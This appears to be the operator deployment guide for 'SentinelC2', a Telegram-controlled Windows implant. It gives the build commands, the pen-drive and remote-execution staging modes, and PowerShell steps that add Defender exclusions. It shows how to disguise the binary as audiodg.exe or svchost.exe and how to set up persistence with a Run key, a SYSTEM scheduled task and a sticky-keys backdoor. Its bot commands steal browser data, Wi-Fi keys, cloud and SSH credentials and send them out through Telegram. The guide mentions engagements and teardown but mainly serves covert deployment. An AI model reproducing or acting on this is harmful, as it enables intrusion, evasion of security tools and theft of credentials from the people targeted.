# SentinelC2 Deployment Guide

End-to-end deployment for the Telegram-primary build (`sentinel_tg_aggressive.exe`). Covers: Telegram bot setup, target deployment, pen-drive staging, ops workflow, teardown.

---

## 1. Telegram setup (one-time, on any device)

You already have:
- Bot: **@IamSentinal_bot**
- Token: `<BOT_TOKEN_FROM_BOTFATHER>`
- Operator chat id: **<OPERATOR_CHAT_ID>** (Sarthak / @sarthakdev143)

### Verify the bot is alive
```powershell
$token = "<BOT_TOKEN_FROM_BOTFATHER>"
(Invoke-WebRequest -Uri "https://api.telegram.org/bot$token/getMe" -UseBasicParsing).Content
```
Should return `{"ok":true,"result":{"id":<BOT_ID>,"is_bot":true,"first_name":"WindowsUpdate",...}}`.

### Open the bot in your Telegram client
On your phone or desktop, search for `@IamSentinal_bot` and press **Start**. The agent sends its "online" message here when it first boots.

### Sanity ping
Send `/help` to the bot. If an agent is connected, you'll get the help text back. If not, you'll get nothing — that's the operator's signal that no agent is currently online.

---

## 2. Operator device setup (one-time, your admin/control machine)

The operator device is where you stage the binary, configure it, and watch the bot. This is the only machine that needs the source + build toolchain.

### 2.1 Build the binary
From the repo root:
```powershell
.\build_sentinel.ps1 -Tg -Variant aggressive
```
Produces `build\sentinel_tg_aggressive.exe` (404 KB). The `-d:variant_aggressive` flag enables:
- Auto-persist on first connect (Run key + scheduled task)
- Self-adds install path to Defender's exclusion list (direct registry write, no PowerShell spawn)
- Same IAT as silent variant: only KERNEL32 / msvcrt / USER32

### 2.2 Verify the IAT
```powershell
python tests/pe_imports.py build\sentinel_tg_aggressive.exe
```
Expected: `winmm in IAT: False` / `avicap in IAT: False`. The Telegram transport is via Windows native `winhttp.dll` (loaded dynamically via `GetProcAddress` — not in the IAT).

### 2.3 Optional: test the round-trip locally
Before deploying to the target, you can run the binary on the operator device itself to verify the bot/API path works. Open a shell as the target user:
```powershell
$env:TELEGRAM_BOT_TOKEN = "<BOT_TOKEN_FROM_BOTFATHER>"
$env:TELEGRAM_CHAT_ID = "<OPERATOR_CHAT_ID>"
$env:C2_NO_PERSIST = "1"          # don't touch registry on test
$env:C2_NO_SANDBOX_CHECK = "1"    # skip sandbox heuristics on test
$env:C2_LOG_FILE = "$env:TEMP\sentinel_test.log"
$env:C2_POLL_INTERVAL = "2"
.\build\sentinel_tg_aggressive.exe
```
Within ~3-4 seconds you should see the **"SentinelC2 / Sentinel online"** message in your Telegram chat with @IamSentinal_bot. Send `/sysinfo` to the bot and the agent replies with the host info.

To stop the test agent: `Stop-Process -Name sentinel_tg_aggressive -Force`.

---

## 3. Target device deployment

Three deployment modes, in order of operational cleanliness:

### Mode A — Pen-drive staging (recommended for first run)
1. Copy `build\sentinel_tg_aggressive.exe` to a USB stick.
2. **Pre-exclude the target's install path** — this is the single most important step. Either:
   - Run `Add-MpPreference -ExclusionPath "C:\ProgramData\Realtek\Audio"` from an admin PowerShell on the target before plugging in the USB, OR
   - Have the target's initial-access loader (the thing that gave you code execution) pre-add the exclusion as part of its own workflow.
3. On the target, plug in the USB, copy `sentinel_tg_aggressive.exe` to the planned install dir, then launch it.
4. The agent self-copies, drops the Run key + scheduled task, registers the install path with Defender via the registry, and sends the online message.

### Mode B — Remote execution (initial access is already a foothold)
```powershell
# From your operator box, push the binary + launch via whatever
# remote-exec channel you have (PsExec, WMI, scheduled-task creation,
# a service install, an Office macro that drops+launches, etc.)
copy \\admin\drop\sentinel_tg_aggressive.exe C:\ProgramData\Realtek\Audio\audiodg.exe
# IMPORTANT: pre-add the install path to Defender exclusion before launching
Add-MpPreference -ExclusionPath "C:\ProgramData\Realtek\Audio" -ErrorAction SilentlyContinue
& C:\ProgramData\Realtek\Audio\audiodg.exe
```

### Mode C — Loader that does the exclusion for you
If your initial-access tool is a custom EXE/MSI, have IT call `Add-MpPreference` before exec'ing the agent. The agent's own `ADD_DEFENDER_EXCLUSION` flag handles the post-install path (i.e., where it self-copies to), but the **initial drop path** still needs operator pre-staging.

### Install-path naming
Default paths chosen to look like normal Windows components:
```
%ProgramData%\Realtek\Audio\audiodg.exe
```
The `audiodg.exe` filename is intentional — it's a real Windows process (Windows Audio Device Graph Isolation) that runs in user sessions, so the process listing won't immediately stand out.

For a quieter install, override via env vars:
```powershell
$env:C2_INSTALL_DIR  = "C:\ProgramData\Microsoft\Network\Connections\Cm"
$env:C2_INSTALL_NAME = "svchost.exe"
```

---

## 4. Configuring the agent at runtime

The agent reads its config from these env vars on first run. **Don't bake the token into the binary** — set them at deploy time so the token can be rotated without rebuilding.

| Env var | Required | Default | Notes |
|---|---|---|---|
| `TELEGRAM_BOT_TOKEN` | yes | (none) | from @BotFather |
| `TELEGRAM_CHAT_ID` | yes | (none) | your user id (<OPERATOR_CHAT_ID>) |
| `C2_INSTALL_DIR` | no | `%ProgramData%\Realtek\Audio` | self-copy target |
| `C2_INSTALL_NAME` | no | `audiodg.exe` | self-copy filename |
| `C2_POLL_INTERVAL` | no | 3 | base poll seconds (min 1) |
| `C2_POLL_TIMEOUT` | no | 30 | long-poll HTTP timeout (min 5) |
| `TELEGRAM_PROXY` | no | (none) | `http://host:port` if egress filtered |
| `C2_LOG_FILE` | no | (none) | debug log path; silent if unset |
| `C2_NO_PERSIST` | no | 0 | set to `1` to skip first-run persistence |
| `C2_NO_SANDBOX_CHECK` | no | 0 | set to `1` to skip anti-analysis checks |

A typical pen-drive launcher (`run.bat` on the USB):
```bat
@echo off
set TELEGRAM_BOT_TOKEN=<BOT_TOKEN_FROM_BOTFATHER>
set TELEGRAM_CHAT_ID=<OPERATOR_CHAT_ID>
start "" "%~dp0sentinel_tg_aggressive.exe"
```

---

## 5. Operator workflow (day-to-day)

Once the agent is online, all interaction is through your Telegram chat with @IamSentinal_bot. The agent only responds to messages from `chat_id = <OPERATOR_CHAT_ID>`. Anyone else messaging the bot is ignored.

### Daily checks
- Open the bot → see the most recent "online" / heartbeat / system info → confirm agent is alive.
- If you don't see anything, the agent is either dead, blocked at the network layer, or being hunted.

### Available commands (send these to @IamSentinal_bot)
```
/help                    # full command list
/sysinfo                 # host, user, OS, admin, exe path
/whoami                  # current user@host
/pwd, /cd <path>         # working directory
/ls [path]               # directory listing (cap 500)
/cat <file>              # first 4 KB of a file
/env [name]              # one env var or all
/drives                  # logical drives
/ipconfig                # ipconfig /all
/wifi                    # saved wifi profiles + cleartext keys
/av                      # AV/EDR process fingerprint
/find <dir>*<glob>       # recursive file search (cap 500)
/clip                    # clipboard snapshot
/ps                      # process list
/kill <pid>              # terminate process
/cmd <shell command>     # run a shell command (timeout 120s)
/screenshot              # capture desktop, sent as PNG document
/upload <path>           # upload file from target to your chat
/dl <file_id>            # download file from your chat to target
/persist                 # install Run key + scheduled task (first connect auto-runs)
/stickykeys              # install sticky-keys backdoor (admin)
/watch start 30          # periodic screenshot every 30s
/watch stop
/cleanup                 # remove Run key + sticky keys (agent stays alive)
/selfdestruct            # full teardown + delete binary
/sleep <seconds>
/exit                    # kill agent (persistence stays)
/status                  # uptime, polls ok/total, persistence state
```

### Exfil (operator-triggered, not auto)
```
/exfil browser           # Chrome/Edge SQLite + Local State (staged for download)
/exfil wifi              # saved wifi profiles (cleartext keys)
/exfil cloud             # AWS / GCP / Azure / Git / Kube creds
/exfil ssh               # %USERPROFILE%\.ssh contents
/exfil recent            # jump lists
/exfil wincreds          # vaultcmd /listcreds
```
After running, `/upload` the staged files. Files land in your Telegram chat as documents.

### Operational notes
- **AMSI/ETW bypass is intentionally NOT enabled.** Defender's behavioral monitor trips on the patch. You trade AMSI-invisible PowerShell output for Defender-clean process survival. The agent still runs PowerShell recon fine — it just shows up in Defender's threat history. If you want AMSI-bypass behavior, set up a Defender exclusion pre-deploy (most ops do this).
- **Defender exclusion is added automatically** by the aggressive variant on first connect (writes to `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`). Requires admin at first-launch time; admin-less installs are still functional, just visible to Defender.
- **The agent uses a single mutex** to prevent multiple instances on the same host. The mutex name is randomized per build.
- **Long-poll is 30s** by default. If the bot is slow, the agent appears idle but is actually waiting for Telegram's response.

---

## 6. Persistence triad (what the agent sets up on first connect)

When `AUTO_PERSIST` is active (aggressive variant):

1. **HKCU Run key**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Realtek HD Audio Update` → `C:\ProgramData\Realtek\Audio\audiodg.exe`
2. **Scheduled task**: `\RealtekAudioUpdateTask` (SYSTEM context, AtLogOn trigger, highest privilege)
3. **Defender exclusion**: `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\Realtek HD Audio Update` → value `0`
4. **Mutex**: `Global\Realtek HD Audio Update Runtime` (randomized per build)

All names are chosen to blend with a normal Windows audio component. None of them contain the original `MicrosoftEdgeUpdate` pattern (which is signatured).

---

## 7. Teardown

When the engagement is done:

### Soft cleanup (keep the binary, remove persistence)
Telegram chat: `/cleanup` — removes the Run key + scheduled task + sticky keys.

### Hard cleanup (full wipe)
Telegram chat: `/selfdestruct` — full teardown. Removes Run key, scheduled task, sticky keys, and scheduled-deletes the binary (a detached `ping 127.0.0.1 -n 5 > nul & del` runs and the agent exits).

### Manual cleanup (if the agent is unreachable)
On the target, as admin:
```powershell
# Remove the run key
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Realtek HD Audio Update' -ErrorAction SilentlyContinue

# Remove the scheduled task
schtasks /delete /tn "RealtekAudioUpdateTask" /f

# Remove the Defender exclusion
Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths' -Name 'C:\ProgramData\Realtek\Audio' -ErrorAction SilentlyContinue

# Delete the binary
Remove-Item "C:\ProgramData\Realtek\Audio\audiodg.exe" -Force -ErrorAction SilentlyContinue

# Remove the meta store
Remove-Item "$env:LOCALAPPDATA\.local\state.bin" -Force -ErrorAction SilentlyContinue
```

---

## 8. Troubleshooting

### "I don't see the online message in my Telegram"
- Check the bot is started in your Telegram app (`/start` to @IamSentinal_bot).
- Verify the token is correct: `Invoke-WebRequest -Uri "https://api.telegram.org/bot<token>/getMe"`. If this fails, the token is wrong or revoked — get a new one from @BotFather.
- Verify the chat id: send any message to the bot, then `Invoke-WebRequest -Uri "https://api.telegram.org/bot<token>/getUpdates"`. The `result[*].message.chat.id` is your actual chat id.
- Check `C2_LOG_FILE` for HTTP error codes. 401 = wrong token. 400 = wrong chat id. 409 = another client is polling (concurrent test issue).

### "The agent gets killed by Defender within seconds"
- This is the SmartScreen reputation check on the initially-deployed binary. The fix is to pre-stage the path in Defender's exclusion list before launch. See Mode A / Mode C in section 3.
- Re-launching the agent from the post-install path (after the first successful run adds it to exclusions) usually works on subsequent boots.

### "The bot responds slowly / not at all"
- Long-poll is 30s. The agent is in `await winHttpPostJson` for up to 30s before it can process a new command. This is normal Telegram behavior, not a bug.
- If the target is on a network with egress filtering, you need `TELEGRAM_PROXY=http://proxy:port` set in the agent's env.

### "I want to rotate the bot token"
1. Create a new bot via @BotFather.
2. Get the new token.
3. Send a new message to the new bot from your Telegram to "wake" it.
4. Update the env var: `$env:TELEGRAM_BOT_TOKEN = "new:token"`.
5. The agent reads the token on every poll — no rebuild needed. But because the env var is read at startup, you need to restart the agent with the new token.

---

## 9. OPSEC checklist (run before deployment)

- [ ] Bot token is fresh (created in the last 7 days, not reused from a previous engagement)
- [ ] Your chat id is the only authorized operator
- [ ] Target's install path is pre-staged in Defender exclusion (Mode A or C)
- [ ] Pen-drive is wiped/clean (not from a previous engagement)
- [ ] Pen-drive contents are scanned with Defender before use
- [ ] `C2_NO_PERSIST=0` only when you actually want persistence (otherwise test with `=1`)
- [ ] `C2_NO_SANDBOX_CHECK=0` in production (otherwise you skip the cheap anti-analysis checks)
- [ ] You have a documented teardown procedure for the engagement

---

## 10. File layout for the operator

```
D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim\
├── sentinel.nim                              # the merged super-agent source
├── build_sentinel.ps1                        # build script (one per transport/variant)
├── build\
│   ├── sentinel_tg_aggressive.exe             # the Telegram-primary binary (THIS IS WHAT YOU DEPLOY)
│   ├── sentinel_tg_silent.exe                 # no auto-persist variant
│   ├── sentinel_tg_engagement.exe             # auto-persist on first connect
│   ├── sentinel_ws_aggressive.exe             # WebSocket variant (needs c2_server on your end)
│   ├── sentinel_both_aggressive.exe           # WS primary + Telegram out-of-band
│   └── c2_server.exe                          # WebSocket C2 server (only for WS / both variants)
├── tests\
│   ├── e2e_harness.py                        # 26-assertion E2E test (WS path)
│   ├── test_crypto.nim                       # AES-GCM round-trip (9 tests)
│   ├── pe_imports.py                         # IAT discipline check
│   └── verify_hardened.py                     # thorough IAT + secret scan
└── DEPLOY_GUIDE.md                           # this file
```
